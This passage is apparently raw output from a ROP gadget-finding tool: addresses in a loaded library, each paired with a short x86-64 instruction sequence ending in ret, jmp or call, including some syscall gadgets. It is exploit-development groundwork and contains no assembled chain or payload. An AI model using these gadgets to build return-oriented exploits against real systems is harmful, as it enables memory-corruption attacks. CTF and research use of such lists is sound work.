0x00002aaaaac2f3f7 : movq qword ptr [rdi - 0x16], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f377 : movq qword ptr [rdi - 0x17], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f2f7 : movq qword ptr [rdi - 0x18], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f277 : movq qword ptr [rdi - 0x19], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f1f7 : movq qword ptr [rdi - 0x1a], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f177 : movq qword ptr [rdi - 0x1b], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f0f7 : movq qword ptr [rdi - 0x1c], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2f067 : movq qword ptr [rdi - 0x1d], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2efd7 : movq qword ptr [rdi - 0x1e], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaac2ef47 : movq qword ptr [rdi - 0x1f], mm0 ; movdqu xmmword ptr [rdi - 0x10], xmm1 ; ret
0x00002aaaaab7b231 : movq qword ptr [rdi - 1], mm0 ; ret
0x00002aaaaab7c725 : movq qword ptr [rdi], mm0 ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7b8e5 : movq qword ptr [rdi], mm0 ; lea rax, qword ptr [rdi + 0xf] ; ret
0x00002aaaaab7c738 : movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], cl ; lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7af58 : movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], cl ; ret
0x00002aaaaab7e1a8 : movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], cl ; xor ch, ch ; mov byte ptr [rdi + 0x11], ch ; ret
0x00002aaaaab7b8f5 : movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], dh ; lea rax, qword ptr [rdi + 0x10] ; ret
0x00002aaaaab7a285 : movq qword ptr [rdi], mm0 ; mov byte ptr [rdi + 0x10], dh ; ret
0x00002aaaaab7b948 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7c798 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; lea rax, qword ptr [rdi + 0x14] ; ret
0x00002aaaaab7a2d8 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dh ; ret
0x00002aaaaab7afab : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; mov byte ptr [rdi + 0x14], dl ; ret
0x00002aaaaab7a2c8 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; ret
0x00002aaaaab7e208 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0x10], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x14], ch ; ret
0x00002aaaaab7b928 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7c778 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0xf], ecx ; lea rax, qword ptr [rdi + 0x13] ; ret
0x00002aaaaab7a2b8 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0xf], ecx ; ret
0x00002aaaaab7e1e8 : movq qword ptr [rdi], mm0 ; mov dword ptr [rdi + 0xf], ecx ; xor ch, ch ; mov byte ptr [rdi + 0x13], ch ; ret
0x00002aaaaab7b9c9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7c819 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; lea rax, qword ptr [rdi + 0x18] ; ret
0x00002aaaaab7a359 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; mov byte ptr [rdi + 0x18], dh ; ret
0x00002aaaaab7a339 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rcx ; ret
0x00002aaaaab7b02c : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rdx ; mov byte ptr [rdi + 0x18], cl ; ret
0x00002aaaaab7a39c : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x17], ecx ; ret
0x00002aaaaab7a3bc : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rdx ; mov dword ptr [rdi + 0x18], ecx ; ret
0x00002aaaaab7a37d : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0x10], rdx ; mov word ptr [rdi + 0x18], cx ; ret
0x00002aaaaab7b989 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xe], rcx ; lea rax, qword ptr [rdi + 0x15] ; ret
0x00002aaaaab7c7d9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xe], rcx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7a2f9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xe], rcx ; ret
0x00002aaaaab7b9a9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xf], rcx ; lea rax, qword ptr [rdi + 0x16] ; ret
0x00002aaaaab7c7f9 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xf], rcx ; lea rax, qword ptr [rdi + 0x17] ; ret
0x00002aaaaab7a319 : movq qword ptr [rdi], mm0 ; mov qword ptr [rdi + 0xf], rcx ; ret
0x00002aaaaab7b909 : movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; lea rax, qword ptr [rdi + 0x11] ; ret
0x00002aaaaab7c759 : movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; lea rax, qword ptr [rdi + 0x12] ; ret
0x00002aaaaab7a299 : movq qword ptr [rdi], mm0 ; mov word ptr [rdi + 0x10], cx ; ret
0x00002aaaaab7b12d : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; mov byte ptr [rdi + 0x20], cl ; ret
0x00002aaaaab7a43a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0x10], xmm2 ; ret
0x00002aaaaab7a3da : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xd], xmm2 ; ret
0x00002aaaaab7a3fa : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xe], xmm2 ; ret
0x00002aaaaab7a41a : movq qword ptr [rdi], mm0 ; movdqu xmmword ptr [rdi + 0xf], xmm2 ; ret
0x00002aaaaab7a275 : movq qword ptr [rdi], mm0 ; ret
0x00002aaaaab7e195 : movq qword ptr [rdi], mm0 ; xor ch, ch ; mov byte ptr [rdi + 0x10], ch ; ret
0x00002aaaaac2f755 : movq qword ptr [rdi], mm1 ; ret
0x00002aaaaab09854 : movq xmm0, rax ; ret
0x00002aaaaab0992a : movq xmm1, rax ; movapd xmm0, xmm1 ; ret
0x00002aaaaab098bd : movq xmm1, rax ; movsd qword ptr [rdi], xmm1 ; ret
0x00002aaaaac6bde8 : movsb byte ptr [rdi], byte ptr [rsi] ; adc al, 0xee ; jmp rsp
0x00002aaaaaae1429 : movsb byte ptr [rdi], byte ptr [rsi] ; adc eax, dword ptr [rax] ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret
0x00002aaaaac6e7f0 : movsb byte ptr [rdi], byte ptr [rsi] ; adc edi, eax ; call rsp
0x00002aaaaac20660 : movsb byte ptr [rdi], byte ptr [rsi] ; add al, byte ptr [rax] ; mov eax, dword ptr [rcx + rax*4] ; mov edx, dword ptr [rcx + rdx*4] ; sub eax, edx ; ret
0x00002aaaaab3d46a : movsb byte ptr [rdi], byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaaba9fb4 : movsb byte ptr [rdi], byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rcx], al ; setg dl ; jmp 0xd4f47
0x00002aaaaabb4b4c : movsb byte ptr [rdi], byte ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rcx], cl ; ret 0xb60f
0x00002aaaaaba2fd4 : movsb byte ptr [rdi], byte ptr [rsi] ; add dword ptr [rax], eax ; add byte ptr [rdi], cl ; mov dh, 0x42 ; add dword ptr [rax - 0x7d], ecx ; ret 0x8401
0x00002aaaaac8a3d5 : movsb byte ptr [rdi], byte ptr [rsi] ; add dword ptr [rax], eax ; test al, 0xf1 ; sti ; call rcx
0x00002aaaaac2fdbe : movsb byte ptr [rdi], byte ptr [rsi] ; add eax, dword ptr [rax] ; movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaac6cdf8 : movsb byte ptr [rdi], byte ptr [rsi] ; and dh, bl ; jmp rsp
0x00002aaaaac822dc : movsb byte ptr [rdi], byte ptr [rsi] ; and eax, dword ptr [rcx] ; add byte ptr [rax], dl ; wait ; hlt ; jmp qword ptr [rcx]
0x00002aaaaac6ea80 : movsb byte ptr [rdi], byte ptr [rsi] ; clc ; push qword ptr [rsp + 0x65640001] ; clc ; jmp rsp
0x00002aaaaac6a959 : movsb byte ptr [rdi], byte ptr [rsi] ; cld ; call qword ptr [rax + 0x10fffca3]
0x00002aaaaac6a995 : movsb byte ptr [rdi], byte ptr [rsi] ; cld ; call qword ptr [rax]
0x00002aaaaac6a955 : movsb byte ptr [rdi], byte ptr [rsi] ; cld ; jmp qword ptr [rax]
0x00002aaaaac6cb78 : movsb byte ptr [rdi], byte ptr [rsi] ; dec dword ptr [rcx + rbp + 0x43740001] ; call rsp
0x00002aaaaac58382 : movsb byte ptr [rdi], byte ptr [rsi] ; in eax, 0x24 ; outsd dx, dword ptr es:[rsi] ; ret 0x5ae4
0x00002aaaaac7f0dc : movsb byte ptr [rdi], byte ptr [rsi] ; int1 ; add byte ptr [rax], al ; jo 0x1aa0fe ; jmp qword ptr [rcx]
0x00002aaaaac6bde4 : movsb byte ptr [rdi], byte ptr [rsi] ; iretd ; add byte ptr [rax], al ; movsb byte ptr [rdi], byte ptr [rsi] ; adc al, 0xee ; jmp rsp
0x00002aaaaac6b918 : movsb byte ptr [rdi], byte ptr [rsi] ; jne 0x196913 ; push qword ptr [rsp + rbp*4 + 0x77040000] ; in eax, dx ; jmp rsp
0x00002aaaaac595dd : movsb byte ptr [rdi], byte ptr [rsi] ; jns 0x184636 ; jmp 0x184577
0x00002aaaaac6aeb0 : movsb byte ptr [rdi], byte ptr [rsi] ; mov ebp, ecx ; jmp rsp
0x00002aaaaac7eddc : movsb byte ptr [rdi], byte ptr [rsi] ; out dx, al ; add byte ptr [rax], al ; xor byte ptr [rdx], cl ; call rsi
0x00002aaaaac09194 : movsb byte ptr [rdi], byte ptr [rsi] ; out dx, eax ; dec dword ptr [rax - 0x77] ; ret 0x8d48
0x00002aaaaac091d3 : movsb byte ptr [rdi], byte ptr [rsi] ; out dx, eax ; dec dword ptr [rax - 0x77] ; ret 0xbfeb
0x00002aaaaac6c950 : movsb byte ptr [rdi], byte ptr [rsi] ; pop rsp ; int1 ; call rsp
0x00002aaaaac6ddac : movsb byte ptr [rdi], byte ptr [rsi] ; popfq ; add dword ptr [rax], eax ; push rsp ; div esi ; call rsp
0x00002aaaaac6fa5c : movsb byte ptr [rdi], byte ptr [rsi] ; push rdi ; add al, byte ptr [rax] ; and al, 0xc3 ; cli ; jmp rsp
0x00002aaaaac855dc : movsb byte ptr [rdi], byte ptr [rsi] ; push rsi ; add dword ptr [rax], eax ; xor byte ptr [rbx - 0xb], bh ; jmp qword ptr [rcx]
0x00002aaaaab0a047 : movsb byte ptr [rdi], byte ptr [rsi] ; ret
0x00002aaaaab3fa58 : movsb byte ptr [rdi], byte ptr [rsi] ; ret 8
0x00002aaaaac7cadc : movsb byte ptr [rdi], byte ptr [rsi] ; retf ; add byte ptr [rax], al ; add byte ptr [rbp - 0x10], dl ; call qword ptr [rax]
0x00002aaaaac6bbcc : movsb byte ptr [rdi], byte ptr [rsi] ; rol byte ptr [rax], 0 ; mov ah, 0xd0 ; in eax, dx ; call rsp
0x00002aaaaac694a5 : movsb byte ptr [rdi], byte ptr [rsi] ; std ; call qword ptr [rax + 0x10fffda4]
0x00002aaaaac694a9 : movsb byte ptr [rdi], byte ptr [rsi] ; std ; call qword ptr [rax]
0x00002aaaaac693e5 : movsb byte ptr [rdi], byte ptr [rsi] ; std ; jmp rcx
0x00002aaaaac6bcf0 : movsb byte ptr [rdi], byte ptr [rsi] ; sti ; in eax, dx ; push qword ptr [rcx + rcx*8 - 0x3ec0000] ; in eax, dx ; call rsp
0x00002aaaaac6fdd4 : movsb byte ptr [rdi], byte ptr [rsi] ; sub eax, dword ptr [rcx] ; add ah, dh ; ret 0xfffd
0x00002aaaaac13724 : movsd dword ptr [rdi], dword ptr [rsi] ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret
0x00002aaaaab4a73f : movsd dword ptr [rdi], dword ptr [rsi] ; add byte ptr [rax], al ; add byte ptr [rax - 0x77], cl ; ret
0x00002aaaaabe3aba : movsd dword ptr [rdi], dword ptr [rsi] ; add dword ptr [rax], eax ; add byte ptr [rbx - 0x76b3fe18], al ; ret 0x2b49
0x00002aaaaac908b2 : movsd dword ptr [rdi], dword ptr [rsi] ; add ebp, eax ; add ebp, esi ; add al, byte ptr [rax] ; ret
0x00002aaaaac82549 : movsd dword ptr [rdi], dword ptr [rsi] ; hlt ; call rax
0x00002aaaaac59c15 : movsd dword ptr [rdi], dword ptr [rsi] ; int1 ; ret 0x5803
0x00002aaaaac594d1 : movsd dword ptr [rdi], dword ptr [rsi] ; mov cl, byte ptr [rip - 0x114f09b0] ; fcmovb st(0), st(3) ; ret
0x00002aaaaac1638b : movsd dword ptr [rdi], dword ptr [rsi] ; mov qword ptr [rbp], rbx ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab73194 : movsd dword ptr [rdi], dword ptr [rsi] ; mov rcx, rax ; xor eax, eax ; mov qword ptr [rdx], rcx ; ret
0x00002aaaaab1d9e2 : movsd dword ptr [rdi], dword ptr [rsi] ; ret
0x00002aaaaac485ff : movsd dword ptr [rdi], dword ptr [rsi] ; ret 0xffea
0x00002aaaaac694ad : movsd dword ptr [rdi], dword ptr [rsi] ; std ; call qword ptr [rax + 0x10fffda5]
0x00002aaaaac694b1 : movsd dword ptr [rdi], dword ptr [rsi] ; std ; call qword ptr [rax]
0x00002aaaaac69431 : movsd dword ptr [rdi], dword ptr [rsi] ; std ; inc dword ptr [rsi - 0x5a] ; std ; call rsi
0x00002aaaaac6942d : movsd dword ptr [rdi], dword ptr [rsi] ; std ; inc esi ; movsd dword ptr [rdi], dword ptr [rsi] ; std ; inc dword ptr [rsi - 0x5a] ; std ; call rsi
0x00002aaaaac693ed : movsd dword ptr [rdi], dword ptr [rsi] ; std ; jmp rcx
0x00002aaaaab5d9dc : movsd dword ptr [rdi], dword ptr [rsi] ; xor eax, dword ptr [rax] ; mov qword ptr [rsp], rax ; call qword ptr [rdx]
0x00002aaaaab10170 : movsd qword ptr [rbx], xmm0 ; add rsp, 0x18 ; pop rbx ; pop rbp ; ret
0x00002aaaaab098c2 : movsd qword ptr [rdi], xmm1 ; ret
0x00002aaaaab0988b : movsd qword ptr [rdi], xmm1 ; subsd xmm0, xmm1 ; ret
0x00002aaaaab0ffe8 : movsd xmm0, qword ptr [rsp + 8] ; add rsp, 0x18 ; ret
0x00002aaaaab8fd48 : movsd xmm0, qword ptr [rsp - 0x10] ; ret
0x00002aaaaab1f1d3 : movsd xmm0, qword ptr [rsp - 8] ; ret
0x00002aaaaac82548 : movsq qword ptr [rdi], qword ptr [rsi] ; hlt ; call rax
0x00002aaaaac173f5 : movsq qword ptr [rdi], qword ptr [rsi] ; ret
0x00002aaaaab09c39 : movss dword ptr [rdi], xmm1 ; ret
0x00002aaaaab09c20 : movss dword ptr [rdi], xmm1 ; subss xmm0, xmm1 ; ret
0x00002aaaaab1f18d : movss xmm0, dword ptr [rsp - 4] ; ret
0x00002aaaaabe303f : movsx eax, bl ; add rsp, 8 ; pop rbx ; pop rbp ; ret
0x00002aaaaab72fcd : movsx eax, byte ptr [rdi + rax] ; test r8b, r8b ; jne 0x9dfba ; ret
0x00002aaaaab7310c : movsx eax, byte ptr [rdi] ; test r8b, r8b ; jne 0x9e0fa ; xor eax, eax ; ret
0x00002aaaaab5f867 : movsx eax, dl ; ret
0x00002aaaaab72f74 : movsx ecx, byte ptr [rdi + rax] ; test cl, cl ; jne 0x9df71 ; ret
0x00002aaaaab730b4 : movsx ecx, byte ptr [rdi] ; test cl, cl ; jne 0x9e0b1 ; xor eax, eax ; ret
0x00002aaaaab254b2 : movsx ecx, byte ptr [rsi] ; cmp edi, ecx ; ja 0x504a3 ; mov eax, r8d ; ret
0x00002aaaaab73004 : movsx edx, byte ptr [rdi + rax] ; cmp edx, esi ; je 0x9e009 ; ret
0x00002aaaaab72f30 : movsx edx, byte ptr [rdi + rax] ; test dl, dl ; jne 0x9df31 ; ret
0x00002aaaaaaf8ac8 : movsx edx, byte ptr [rdx + 0x1b] ; mov dword ptr [rax + 0x50], ecx ; mov dword ptr [rax + 0x54], edx ; ret
0x00002aaaaab72fcc : movsx r8d, byte ptr [rdi + rax] ; test r8b, r8b ; jne 0x9dfbb ; ret
0x00002aaaaab7310b : movsx r8d, byte ptr [rdi] ; test r8b, r8b ; jne 0x9e0fb ; xor eax, eax ; ret
0x00002aaaaab976a8 : movsxd r8, dword ptr [rdx + r8*4] ; add rdx, r8 ; jmp rdx
0x00002aaaaab5e1e1 : movsxd r9, dword ptr [r10 + r9*4] ; lea r10, qword ptr [r10 + r9] ; jmp r10
0x00002aaaaac2d35b : movsxd r9, dword ptr [r11 + r9*4] ; add r9, r11 ; jmp r9
0x00002aaaaac2542b : movsxd r9, dword ptr [r11 + r9*4] ; lea r9, qword ptr [r11 + r9] ; jmp r9
0x00002aaaaab72e80 : movsxd r9, dword ptr [rax + r9*4] ; add rax, r9 ; jmp rax
0x00002aaaaab72de0 : movsxd rax, dword ptr [r10 + r9*4] ; add r10, rax ; jmp r10
0x00002aaaaab72d17 : movsxd rax, dword ptr [r10 + rax*4] ; add r10, rax ; jmp r10
0x00002aaaaab59994 : movsxd rax, dword ptr [r13 + rax*4] ; add rax, r13 ; jmp rax
0x00002aaaaab03bb7 : movsxd rax, dword ptr [r14 + rax*4] ; add rax, r14 ; jmp rax
0x00002aaaaab20602 : movsxd rax, dword ptr [rax + rdx*4] ; add rax, rdi ; jmp rax
0x00002aaaaab38884 : movsxd rax, dword ptr [rcx + rax*4] ; add rcx, rax ; jmp rcx
0x00002aaaaaba8401 : movsxd rax, dword ptr [rdi + rax*4] ; add rax, rdi ; jmp rax
0x00002aaaaaaf60b3 : movsxd rax, dword ptr [rdx + rax*4] ; add rdx, rax ; jmp rdx
0x00002aaaaab411d2 : movsxd rax, dword ptr [rsi + rax*4] ; add rax, rsi ; jmp rax
0x00002aaaaab41301 : movsxd rax, dword ptr [rsi + rax*4] ; add rsi, rax ; jmp rsi
0x00002aaaaab038ed : movsxd rax, dword ptr [rsi + rcx*4] ; add rsi, rax ; jmp rsi
0x00002aaaaab7f017 : movsxd rax, dword ptr [rsi + rdi*4] ; add rsi, rax ; jmp rsi
0x00002aaaaab0fb4a : movsxd rax, dword ptr [rsp + 0xc] ; add rsp, 0x18 ; ret
0x00002aaaaac1eb94 : movsxd rax, ecx ; add rax, rdi ; ret
0x00002aaaaac1ea58 : movsxd rax, ecx ; add rax, rdi ; sub rax, r8 ; ret
0x00002aaaaac1ecad : movsxd rax, ecx ; add rax, rdi ; sub rax, rdx ; ret
0x00002aaaaac1eb2d : movsxd rax, ecx ; ret
0x00002aaaaac1bdcb : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg ah, bl ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1fd78 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg bh, bh ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f598 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg bh, bl ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f988 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg bh, ch ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f1a8 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg bh, cl ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c92b : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rax], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1c10b : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rcx - 0x7cb80000], bl ; ret 0xe910
0x00002aaaaac1b8eb : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rax + rdx - 0x7cb80000], bh ; ret 0xe910
0x00002aaaaac1f347 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rax], dh ; adc byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1c44b : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rax], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1bc2b : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rcx], bh ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1b40b : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rbp + rdx - 0x7cb80000], bl ; ret 0xe910
0x00002aaaaac1c5eb : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rbx + rax - 0x7cb80000], bh ; ret 0xe910
0x00002aaaaac1f838 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bh ; or eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f058 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], bl ; adc eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac20168 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rdi], cl ; add al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1b74b : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rdx + rdx], bl ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1b881 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; adc dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c581 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], ah ; add al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c0a1 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], al ; or dword ptr [rax], eax ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1f739 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], bh ; or al, 0 ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac20069 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg byte ptr [rsi], cl ; add eax, dword ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1c8c1 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg dh, ah ; add byte ptr [rax], al ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1bbc1 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg dh, ah ; or eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1b6e1 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg dh, al ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0x4910
0x00002aaaaac1c3e1 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg dh, al ; add eax, 0x83480000 ; ret 0x4910
0x00002aaaaac1f889 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg dh, ch ; or al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac1f0a9 : movsxd rax, ecx ; sbb cl, byte ptr [rdi] ; xchg dh, cl ; adc al, byte ptr [rax] ; add byte ptr [rax - 0x7d], cl ; ret 0xe910
0x00002aaaaac5acb5 : movsxd rbp, ebp ; dec edx ; push 0x65f7ffed ; in eax, dx ; call rdx
0x00002aaaaac1ebd4 : movsxd rbx, ebx ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaabdd96d : movsxd rbx, ebx ; mov qword ptr [rip + 0x2ba8ca], rbx ; pop rbx ; ret
0x00002aaaaab7a8aa : movsxd rcx, dword ptr [r11 + r8*4] ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab1cc91 : movsxd rcx, dword ptr [r11 + rcx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaac4285d : movsxd rcx, dword ptr [r11 + rdx*4] ; add rcx, r11 ; jmp rcx
0x00002aaaaab7a039 : movsxd rcx, dword ptr [r11 + rdx*4] ; lea rcx, qword ptr [r11 + rcx] ; jmp rcx
0x00002aaaaab00e43 : movsxd rcx, dword ptr [r8 + rcx*4] ; add rcx, r8 ; jmp rcx
0x00002aaaaab311ed : movsxd rcx, dword ptr [rax + r12*4] ; add rax, rcx ; jmp rax
0x00002aaaaab68d3d : movsxd rcx, dword ptr [rax + rcx*4] ; add rax, rcx ; jmp rax
0x00002aaaaac09cb6 : movsxd rcx, dword ptr [rax + rsi*4] ; add rax, rcx ; jmp rax
0x00002aaaaac10b05 : movsxd rcx, dword ptr [rax + rsi*4] ; shr rdx, 3 ; add rax, rcx ; jmp rax
0x00002aaaaab08297 : movsxd rcx, dword ptr [rdi + rcx*4] ; add rcx, rdi ; jmp rcx
0x00002aaaaabc727c : movsxd rcx, dword ptr [rdx + rcx*4] ; add rdx, rcx ; jmp rdx
0x00002aaaaac1ea49 : movsxd rcx, ebx ; add cl, byte ptr [rdi] ; xchg eax, edx ; ret 0xf40
0x00002aaaaac1eab0 : movsxd rcx, ecx ; cmp ch, byte ptr [rcx] ; ret 0xd089
0x00002aaaaac1ea77 : movsxd rcx, ecx ; lea rax, qword ptr [rdi + rcx] ; sub rax, r8 ; ret
0x00002aaaaabb5e98 : movsxd rdi, dword ptr [r11 + rdi*4] ; add rdi, r11 ; jmp rdi
0x00002aaaaabf65a0 : movsxd rdi, dword ptr [rdi] ; mov eax, 3 ; syscall ; ret
0x00002aaaaac69325 : movsxd rdi, ebx ; push qword ptr [rax + 0x64] ; sti ; inc eax ; sti ; call qword ptr [rax]
0x00002aaaaab030b5 : movsxd rdi, edi ; mov eax, dword ptr [rax + rdi*4] ; ret
0x00002aaaaab02f45 : movsxd rdi, edi ; movzx eax, word ptr [rax + rdi*2] ; and eax, 1 ; ret
0x00002aaaaac254ff : movsxd rdx, dword ptr [r11 + rdx*4] ; lea rdx, qword ptr [r11 + rdx] ; jmp rdx
0x00002aaaaab31148 : movsxd rdx, dword ptr [rax + r12*4] ; add rax, rdx ; jmp rax
0x00002aaaaaba5ffe : movsxd rdx, dword ptr [rax + r14*4] ; add rax, rdx ; jmp rax
0x00002aaaaabadf65 : movsxd rdx, dword ptr [rax + rbp*4] ; add rax, rdx ; jmp rax
0x00002aaaaab59738 : movsxd rdx, dword ptr [rax + rbx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab03c95 : movsxd rdx, dword ptr [rax + rcx*4] ; add rax, rdx ; jmp rax
0x00002aaaaab30f52 : movsxd rdx, dword ptr [rax + rdx*4] ; add rax, rdx ; jmp rax
0x00002aaaaaba212b : movsxd rdx, dword ptr [rax + rsi*4] ; add rax, rdx ; jmp rax
0x00002aaaaab38e45 : movsxd rdx, dword ptr [rcx + rdx*4] ; add rcx, rdx ; jmp rcx
0x00002aaaaabb56b2 : movsxd rdx, dword ptr [rcx + rdx*4] ; add rdx, rcx ; jmp rdx
0x00002aaaaabf8382 : movsxd rdx, eax ; add rdi, rdx ; mov qword ptr [r9], rdi ; ret
0x00002aaaaabcad26 : movsxd rdx, edx ; mov eax, 0x1c ; syscall ; neg eax ; ret
0x00002aaaaabf8201 : movsxd rdx, edx ; mov eax, r8d ; mov byte ptr [rdi + rdx], 0 ; ret
0x00002aaaaab7f0a7 : movsxd rsi, dword ptr [rax + rdx*4] ; add rax, rsi ; jmp rax
0x00002aaaaab99722 : movsxd rsi, dword ptr [rax + rsi*4] ; add rax, rsi ; jmp rax
